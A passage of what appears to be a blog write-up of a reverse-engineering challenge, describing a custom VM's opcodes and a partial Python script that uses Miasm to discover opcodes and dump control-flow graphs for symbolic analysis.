\u003Ccode>VM_MEM_PTR\u003C/code>.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-28.png\" alt=\"MEMSTORE\">\u003C/p>\n\u003Chr>\n\u003Cp>MEMFETCH Opcode\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>Handler: 0x00001cf7\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Loads a value from VM memory into a register.\r\n\u003Ca href=\"/images/posts/vmware/image-29.png\">MEMFETCH\u003C/a>\u003C/p>\n\u003Cp>TO put it simply here’s the functioning of the VM\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-30.png\" alt=\"image\">\r\n!\u003C/p>\n\u003Cp>After that i came across this article which was a very embedded emulator type VM which has also very much OP codes ;\r\n\u003Ca href=\"https://miasm.re/blog/2016/09/03/zeusvm_analysis.html\">https://miasm.re/blog/2016/09/03/zeusvm_analysis.html\u003C/a>\u003C/p>\n\u003Ch3 id=\"why-miasm\">WHy miasm ??\u003C/h3>\n\u003Cp>Miasm helps automate this process. After instructions are converted to IR, Miasm can symbolically execute them, meaning it treats inputs as unknown variables and follows all possible program paths automatically.\u003C/p>\n\u003Cp>In this challenge, the binary does not directly compare user input. Instead, it runs everything inside a custom VM. Traditional tools struggle here because they do not understand the VM’s instruction set.\u003C/p>\n\u003Cp>By implementing this VM as a custom architecture in Miasm, the VM bytecode can be executed symbolically instead of manually emulated. Miasm automatically tracks relationships between registers, stack values, and memory, and generates constraints on user input. These constraints can then be solved using SMT solvers.\u003C/p>\n\u003Cp>So after reading some guides u need to make some files for misam , which like in the diagram below\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-31.png\" alt=\"miasm vm architecture layout\">\u003C/p>\n\u003Cp>the \u003Ccode>regs.py\u003C/code> file is used to define the VM registers, \u003Ccode>arch.py\u003C/code> ties the architecture together and describes basic properties like the program counter, and \u003Ccode>sem.py\u003C/code> defines the actual semantics of each VM instruction\u003C/p>\n\u003Cp>I first needed the bytecode that the VM actually executes, because the main binary never runs it directly on the CPU. The program decodes some Base64 data at runtime and then passes the decoded result to the VM as its instruction stream. Instead of trying to analyze everything at once, I focused on grabbing this decoded data and saving it as a raw binary file. This became the input for Miasm. For the later VM layers, the VM itself loads another bytecode buffer from a ROM-like area in its memory, so I reused those unpacked buffers as well.\u003C/p>\n\u003Cp>Once I had the custom VM architecture wired up in Miasm, the next step was actually getting a disassembler working for the bytecode. I am not a Miasm wizard, so I did the simple thing: I read through the original writeup and kept Miasm’s own blog open as a reference, especially their “Playing with dynamic symbolic execution” article, just to understand how they build CFGs and IR and then simplify them:\r\n\u003Ca href=\"https://miasm.re/blog/2017/10/05/playing_with_dynamic_symbolic_execution.html#enhancing-coverage-breaking-a-crackme\">https://miasm.re/blog/2017/10/05/playing_with_dynamic_symbolic_execution.html#enhancing-coverage-breaking-a-crackme\u003C/a>\r\nUsing that as a guide, I wrote a small Python script that feeds the VM bytecode into Miasm’s Machine(“vmv”), walks over all the basic blocks, looks for simple patterns like PUSH_REG; PUSH_IMM; JE to recover opcode values, and then saves out the control flow and simplified IR as .dot graphs. It is basically a hacked-together disassembler pass that does just enough for this challenge: discover opcodes for each nesting level, teach Miasm about them, then spit out IR I can actually reason about instead of staring at raw 32 bit words.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">from\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> collections \u003C/span>\u003Cspan style=\"color:#F97583\">import\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> defaultdict\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">import\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> struct\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">import\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> subprocess\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">from\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> miasm.analysis.machine \u003C/span>\u003Cspan style=\"color:#F97583\">import\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> Machine\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">from\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> miasm.analysis.simplifier \u003C/span>\u003Cspan style=\"color:#F97583\">import\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    IRCFGSimplifierCommon,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    IRCFGSimplifierSSA,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">from\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> miasm.core.locationdb \u003C/span>\u003Cspan style=\"color:#F97583\">import\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> LocationDB\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">from\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> miasm.core.utils \u003C/span>\u003Cspan style=\"color:#F97583\">import\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ExprInt\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">from\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> miasm.arch.vmv.regs \u003C/span>\u003Cspan style=\"color:#F97583\">import\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">from\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> miasm.arch.vmv.arch \u003C/span>\u003Cspan style=\"color:#F97583\">import\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">import\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> miasm.arch.vmv.arch \u003C/span>\u003Cspan style=\"color:#F97583\">as\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> arch_vmv\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">#\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\"># Dispatcher offsets -> semantic opcode mapping\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\"># These offsets are stable across VM layers.\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">#\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">vm_handler_map \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">cb8\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: (\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"EXIT_REG\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,      reg_idx),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">bcc\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: (\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"DEC\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,           reg_idx),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">d70\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: (\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"RET\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">6e8\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: (\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"MEMFETCH\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,      reg_idx),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">cd8\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: (\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"CALL\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,          imm32),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">358\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: (\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"PUTCHAR_REG\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,   reg_idx),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">444\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: (\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"JMP\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,           imm32),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">980\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: (\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"XOR\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">8fc\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: (\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"MUL\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">770\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: (\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"AND\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">b68\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: (\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"INC\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,           reg_idx),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">4ac\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: (\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"JE\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,            imm32),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">67c\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: (\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"MEMSTORE\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,      reg_idx),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">878\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: (\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"ADD\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">380\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: (\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"PUSH_IMM\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,      imm32),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">3f0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: (\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"ROMFETCH\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,      reg_idx),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">3b0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: (\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"PUSH_REG\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,      reg_idx),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">594\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: (\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"JNE\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,           imm32),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">a04\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: (\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"PUTCHAR_IMM\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,   putchar_imm32),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">a44\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: (\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"EXIT_IMM\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,      imm32),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">a54\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: (\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"MEMSHIFT_IMM\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,  imm32),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">aa0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: (\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"MEMSHIFT_REG\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,  reg_idx),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">afc\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: (\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"POP\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,           reg_idx),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">c30\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: (\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"MOD\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,           reg_idx),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">def\u003C/span>\u003Cspan style=\"color:#B392F0\"> dump_cfg\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(cfg, path):\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">    \"\"\"Dump CFG/IR to .dot and render it using graphviz.\"\"\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    with\u003C/span>\u003Cspan style=\"color:#79B8FF\"> open\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(path, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"w\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) \u003C/span>\u003Cspan style=\"color:#F97583\">as\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> f:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        f.write(cfg.dot())\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    subprocess.call([\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">        \"dot\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"-Tpng\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        path,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">        \"-o\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, path.replace(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\".dot\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\".png\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    ])\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">#\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\"># Opcode discovery logic\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">#\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">def\u003C/span>\u003Cspan style=\"color:#B392F0\"> vm_opcode_probe\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(mdis, block, _):\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">    \"\"\"Inspect VM basic blocks for dispatcher patterns.\"\"\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    # Dispatcher entry:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    #   PUSH_REG\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    #   PUSH_IMM &#x3C;opcode>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    #   JE &#x3C;handler>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    #\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    lines \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> block.lines\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">        len\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(lines) \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 3\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        and\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lines[\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">].name \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"PUSH_REG\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        and\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lines[\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">].name \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"PUSH_IMM\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        and\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lines[\u003C/span>\u003Cspan style=\"color:#79B8FF\">2\u003C/span>\u003Cspan style=\"color:#E1E4E8\">].name \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"JE\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    ):\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        imm \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lines[\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">].args[\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        dst \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lines[\u003C/span>\u003Cspan style=\"color:#79B8FF\">2\u003C/span>\u003Cspan style=\"color:#E1E4E8\">].args[\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        if\u003C/span>\u003Cspan style=\"color:#79B8FF\"> isinstance\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(imm, ExprInt):\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            opcode \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> int\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(imm.arg)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            handler \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> mdis.loc_db.get_location_offset(dst.loc_key)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            vm_opcodes[opcode] \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> handler\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    #\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    # VM layer init block (xor constants)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    #\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> mdis.loc_db.get_location_offset(block.loc_key) \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">e8\u003C/span>\u003Cspan style=\"color:#E1E4E8\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        arch_vmv.putchar_xorlist.append(\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">            int\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(lines[\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">].args[\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]) \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">ff\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        )\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        arch_vmv.reg_xorlist.append(\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">            int\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(lines[\u003C/span>\u003Cspan style=\"color:#79B8FF\">2\u003C/span>\u003Cspan style=\"color:#E1E4E8\">].args[\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]) \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">ff\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        )\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">def\u003C/span>\u003Cspan style=\"color:#B392F0\"> register_vm_opcodes\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(opcodes, level):\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">    \"\"\"Register decoded opcode values into Miasm.\"\"\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">    print\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">f\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">[vm\u003C/span>\u003Cspan style=\"color:#79B8FF\">{\u003C/span>\u003Cspan style=\"color:#E1E4E8\">level\u003C/span>\u003Cspan style=\"color:#79B8FF\">}\u003C/span>\u003Cspan style=\"color:#9ECBFF\">] registering opcodes\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    for\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> opcode, handler_off \u003C/span>\u003Cspan style=\"color:#F97583\">in\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> opcodes.items():\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        name_def \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> vm_handler_map[handler_off]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        mnemonic \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> name_def[\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        operands \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> name_def[\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">:] \u003C/span>\u003Cspan style=\"color:#F97583\">if\u003C/span>\u003Cspan style=\"color:#79B8FF\"> len\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(name_def) \u003C/span>\u003Cspan style=\"color:#F97583\">>\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 